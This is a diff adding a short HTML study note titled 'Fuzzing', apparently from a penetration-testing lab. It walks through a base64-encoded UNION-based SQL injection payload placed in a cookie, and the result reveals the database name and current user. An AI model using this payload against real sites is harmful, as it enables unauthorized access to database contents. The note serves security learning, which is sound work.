@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Fuzzing</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Fuzzing</h1><br/><br />a) Let&#39;s encode the query.<br />    <br />    QUERY: “&#39;) UNION select 1, database(), current_user #”.<br /><br />    After encoding it we have “JykgVU5JT04gc2VsZWN0IDEsIGRhdGFiYXNlKCksIGN1cnJlbnRfdXNlciAj”<br /><br />b) Copy the value to the cookie value.<br /><br />    <a href=""><img src="images/178-1.png" alt="images/178-1.png" /></a><br /><br />c) Refresh the page.<br /><br />    <a href=""><img src="images/178-2.png" alt="images/178-2.png" /></a><br /><br />    Result: We have the database and current user values. “security” andkali@localhost&quot;.<br /><br /><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
